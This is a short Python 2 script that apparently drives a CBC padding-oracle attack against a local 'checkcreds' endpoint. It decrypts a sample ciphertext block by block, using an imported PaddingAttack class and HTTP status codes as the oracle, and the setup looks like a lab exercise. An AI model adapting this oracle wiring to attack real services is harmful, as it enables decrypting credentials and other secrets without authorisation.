import urllib
from oracle import PaddingAttack
import logging

sample_encrypted = "514e7e6ab9141a427c6a1228b5dd6d2337da9a996b668acc550ee716dcc70072"

def try_sending(enc_block):
    base_url = "http://localhost/checkcreds?enc="
    base_url += enc_block
    response = urllib.urlopen(base_url)
    return_code = response.getcode()
    if return_code in [200, 404, 500]:
        return return_code
    raise Exception("Yikes!")


def main():
    p = PaddingAttack(sample_encrypted[0:32], "LOLOLOLOLOLOLOLO".encode("hex"), try_sending, 16, logging.DEBUG)
    print p.attack()
    p = PaddingAttack(sample_encrypted[32:64], sample_encrypted[0:32], try_sending, 16, logging.DEBUG)
    print p.attack()


if __name__ == '__main__':
    main()

